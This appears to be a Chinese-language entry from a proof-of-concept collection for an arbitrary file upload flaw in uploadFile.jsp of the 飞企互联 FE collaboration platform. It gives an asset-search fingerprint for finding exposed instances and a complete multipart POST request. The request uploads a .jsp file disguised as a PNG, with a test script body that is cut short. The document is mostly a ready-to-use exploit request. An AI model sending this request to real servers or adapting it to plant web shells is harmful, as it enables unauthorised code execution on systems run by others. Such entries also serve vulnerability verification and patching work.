# 飞企互联FE业务协作平台uploadFile.jsp任意文件上传漏洞

- **系统**：飞企互联FE业务协作平台uploadFile.jsp　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`http://xx.xx.xx.xx/common/uploadFile.jsp`

**请求体 / payload**
```
访问如下页面返回200，出现以下页面表示可能存在漏洞

上传文件
POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=23092446220001.jpg&title1=%CE%C4%BC%FE%C9%CF%B4%AB&title2=%D1%A1%D4%F1%CE%C4%BC%FE%A3%BA&allowsize=null&extName=.jsp HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=---------------------------289579299639009738743696321529
Content-Length: 7542
Cookie: JSESSIONID=F1CA47A72BBC533FE551E29372212913
-----------------------------289579299639009738743696321529
Content-Disposition: form-data; name="iconFile"; filename="1.jsp"
Content-Type: image/png
<% out.println("test");…（脚本共 731 字，完整版见原文）
```

**其他**
- 飞企互联FE业务协作平台uploadFile.jsp任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台